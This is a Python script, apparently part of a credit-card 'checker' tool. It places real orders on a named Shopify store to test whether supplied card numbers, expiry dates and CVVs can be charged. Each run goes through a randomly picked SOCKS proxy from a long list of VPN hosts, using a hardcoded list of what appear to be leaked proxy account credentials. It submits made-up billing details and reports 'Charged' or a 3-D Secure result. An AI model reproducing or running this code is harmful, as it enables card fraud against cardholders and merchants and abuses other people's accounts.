import aiohttp
from tenacity import retry, stop_after_attempt
from urllib.parse import urlparse, quote
import asyncio
import random
import string
from aiohttp_socks.connector import ProxyConnector
from gates.functions.func_imp import find_between,get_random_string

array_proxis = [
'iad.socks.ipvanish.com:1080',  
'atl.socks.ipvanish.com:1080',  
'bos.socks.ipvanish.com:1080',  
'clt.socks.ipvanish.com:1080',  
'chi.socks.ipvanish.com:1080',  
'cvg.socks.ipvanish.com:1080',  
'dal.socks.ipvanish.com:1080',  
'den.socks.ipvanish.com:1080',  
'dtw.socks.ipvanish.com:1080',  
'hou.socks.ipvanish.com:1080',  
'las.socks.ipvanish.com:1080',  
'lax.socks.ipvanish.com:1080',  
'mia.socks.ipvanish.com:1080',  
'msp.socks.ipvanish.com:1080',  
'msy.socks.ipvanish.com:1080',  
'nyc.socks.ipvanish.com:1080',  
'phx.socks.ipvanish.com:1080',  
'sjc.socks.ipvanish.com:1080',  
'sea.socks.ipvanish.com:1080',  
'stl.socks.ipvanish.com:1080',  
'dxb.socks.ipvanish.com:1080',  
'ist.socks.ipvanish.com:1080',  
'tpe.socks.ipvanish.com:1080',  
'zrh.socks.ipvanish.com:1080',  
'sto.socks.ipvanish.com:1080',  
'mad.socks.ipvanish.com:1080',  
'vlc.socks.ipvanish.com:1080',  
'jnb.socks.ipvanish.com:1080',  
'lju.socks.ipvanish.com:1080',  
'man.socks.ipvanish.com:1080',  
'lon.socks.ipvanish.com:1080',  
'gla.socks.ipvanish.com:1080',  
'bhx.socks.ipvanish.com:1080',  
'tia.socks.ipvanish.com:1080',  
'eze.socks.ipvanish.com:1080',  
'sin.socks.ipvanish.com:1080',  
'beg.socks.ipvanish.com:1080',  
'otp.socks.ipvanish.com:1080',  
'lis.socks.ipvanish.com:1080',  
'waw.socks.ipvanish.com:1080',  
'lim.socks.ipvanish.com:1080',  
'syd.socks.ipvanish.com:1080',  
'per.socks.ipvanish.com:1080',  
'mel.socks.ipvanish.com:1080',  
'bne.socks.ipvanish.com:1080',  
'adl.socks.ipvanish.com:1080',  
'vie.socks.ipvanish.com:1080',  
'bru.socks.ipvanish.com:1080',  
'gru.socks.ipvanish.com:1080',  
'sof.socks.ipvanish.com:1080',  
'yvr.socks.ipvanish.com:1080',  
'tor.socks.ipvanish.com:1080',  
'yul.socks.ipvanish.com:1080',  
'scl.socks.ipvanish.com:1080',  
'bog.socks.ipvanish.com:1080',  
'osl.socks.ipvanish.com:1080',  
'akl.socks.ipvanish.com:1080',  
'ams.socks.ipvanish.com:1080',  
'kiv.socks.ipvanish.com:1080',  
'gdl.socks.ipvanish.com:1080',  
'kul.socks.ipvanish.com:1080',  
'lux.socks.ipvanish.com:1080',  
'rix.socks.ipvanish.com:1080',  
'sel.socks.ipvanish.com:1080',  
'nrt.socks.ipvanish.com:1080',  
'lin.socks.ipvanish.com:1080',  
'tlv.socks.ipvanish.com:1080',  
'dub.socks.ipvanish.com:1080',  
'pnq.socks.ipvanish.com:1080',  
'rkv.socks.ipvanish.com:1080',  
'bud.socks.ipvanish.com:1080',  
'hkg.socks.ipvanish.com:1080',  
'ath.socks.ipvanish.com:1080',  
'fra.socks.ipvanish.com:1080',  
'bod.socks.ipvanish.com:1080',  
'mrs.socks.ipvanish.com:1080',  
'par.socks.ipvanish.com:1080',  
'hel.socks.ipvanish.com:1080',  
'tll.socks.ipvanish.com:1080',  
'cph.socks.ipvanish.com:1080',  
'zag.socks.ipvanish.com:1080',  
'sjo.socks.ipvanish.com:1080',  
'prg.socks.ipvanish.com:1080',  
    ]

array_users = [
    'zQHd9KfmLwD3:FsiVV6AC',
    'qBEckiNMdqn:TL30gFFXyKU',
    '4NEdwmoJ:0Dq191hBa3X',
    'mP5mfw54Fn:qlqRbgPQHelx',
    'LXPtwTyyw5:qGDOrqRolg2g',
    'lznCI6R1:b71HMmDXoS',
    'L9YlL9edkTG1:VJN9TpUCy',
    '3sHnwIEn:hcMdj5X9g6',
    'qPY7gEUfc7:oMsu6UxCn',
    'QOW0AbXe:KjBlPtsDxfY',
    'Ofzb6WdvtgBb:KNLq8Mpaw',
    'nBepvF9uO:6vJly4wt',
    'OqqcsTcJ:S8z28lANy',
    'AFv8HYNG7c:AFv8HYNG7c',
    'IxmCtcBB:qWaz55pynpt',
    'KQfTJCXa:EsP2TKCsdW',
    'zZGGf3skNpWm:l9haVmMi8nwf',
    'rCEjnngXzHpF:0VjxxVJE',
    'qlQNC68vf:50nVTwPu',
    'l9ypSRSj:PP2s4NM1vPzd',
    'KEKonJGmn:s81Y5eRYRQT2',
    'cI8rs4bEa:j3hfVdqcJB',
    'XseLDKFN:QW2q90jH',
    'H1LvLr7NikW:961iXrX7nQA'
]



@retry(stop=stop_after_attempt(3))
async def auto_sho_async(cc,mes,ano,cvv):


	link = 'https://spongelle.com/'

	ip,port = random.choice(array_proxis).split(':')
	username,password = random.choice(array_users).split(':')

	conn = ProxyConnector.from_url(f'socks5://{username}:{password}@{ip}:{port}')

	async with aiohttp.ClientSession(connector=conn) as session:

		
		
		payload_1 = {
		'id': '39805684383814'
		}

		req1 = await session.post(url=f'https://spongelle.com/cart/add.js',data=payload_1,timeout=aiohttp.ClientTimeout(total=5))


		req3 = await session.post(url=f"https://spongelle.com/cart",data={"checkout":""},timeout=aiohttp.ClientTimeout(total=5))

		checkout_url = req3.url


		authenticity_token = get_random_string(86)


		headers = {
		                
		                'Content-Type': 'application/x-www-form-urlencoded',
		                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
		               
		            }


		payload_2 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=contact_information&step=payment_method&checkout%5Bemail%5D=jeysom985%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bbilling_address%5D%5Bfirst_name%5D=&checkout%5Bbilling_address%5D%5Blast_name%5D=&checkout%5Bbilling_address%5D%5Bcompany%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=&checkout%5Bbilling_address%5D%5Bcountry%5D=&checkout%5Bbilling_address%5D%5Bprovince%5D=&checkout%5Bbilling_address%5D%5Bzip%5D=&checkout%5Bbilling_address%5D%5Bphone%5D=&checkout%5Bbilling_address%5D%5Bcountry%5D=United+States&checkout%5Bbilling_address%5D%5Bfirst_name%5D=Sin&checkout%5Bbilling_address%5D%5Blast_name%5D=Rol&checkout%5Bbilling_address%5D%5Bcompany%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=Christopher+Street&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=New+York&checkout%5Bbilling_address%5D%5Bprovince%5D=NY&checkout%5Bbilling_address%5D%5Bzip%5D=10014&checkout%5Bbilling_address%5D%5Bphone%5D=%28212%29+589-9632&checkout%5Bbuyer_accepts_sms%5D=0&checkout%5Bsms_marketing_phone%5D=&checkout%5Bclient_details%5D%5Bbrowser_width%5D=753&checkout%5Bclient_details%5D%5Bbrowser_height%5D=493&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360'


		req4 = await session.post(url=checkout_url,headers=headers,data=payload_2,timeout=aiohttp.ClientTimeout(total=5))

		#print(req4.history)




# 		payload_3 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-Standard%2520%285-10%2520days%29-6.00&checkout%5Bclient_details%5D%5Bbrowser_width%5D=836&checkout%5Bclient_details%5D%5Bbrowser_height%5D=547&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360'


# 		req5 = await session.post(url=checkout_url, headers=headers,data=payload_3,timeout=aiohttp.ClientTimeout(total=5),proxy=proxy,proxy_auth=proxy_auth)

# 		print(req5.history)



		payload_4 = {
  "credit_card": {
    "number": f"{cc[0:4]} {cc[4:8]} {cc[8:12]} {cc[12:16]}",
    "name": "Sin Rol",
    "month": mes,
    "year": ano,
    "verification_value": cvv
  },
  "payment_session_scope": "spongelle.com"
}

		req6 = await session.post(url='https://deposit.us.shopifycs.com/sessions',json=payload_4,timeout=aiohttp.ClientTimeout(total=5))


		token = await req6.json()

		id_ = token.get('id')

		#print(id_)

		
		#print(id_)

		payload_5 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=payment_method&step=&s={id_}&checkout%5Bpayment_gateway%5D=9191487&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=%2B12125899632&checkout%5Bpost_purchase_page_requested%5D=1&checkout%5Btotal_price%5D=75&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=770&checkout%5Bclient_details%5D%5Bbrowser_height%5D=493&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360'

		req7 = await session.post(url=checkout_url,headers=headers,data=payload_5,timeout=aiohttp.ClientTimeout(total=8))


		await asyncio.sleep(5)

		processing_url = req7.url



		req8 = await session.get(str(processing_url) + '?from_processing_page=1',timeout=aiohttp.ClientTimeout(total=5))

		#print(req8.status)

		await asyncio.sleep(5)
		


		req9 = await session.get(req8.url,timeout=aiohttp.ClientTimeout(total=5))


		text_resp = await req9.text()

		resp = find_between(text_resp, 'notice__text">','<')


		if '/thank_you' in str(req9.url) or '/orders/' in str(req9.url) or '/post_purchase' in str(req9.url):

			resp = 'Charged'

		elif '/3d_secure_2/' in str(req9.url):

			resp = '3d_secure_2'


		return resp







#asyncio.run(main=auto_sho_async('5213504657925759','01','2024','848'))




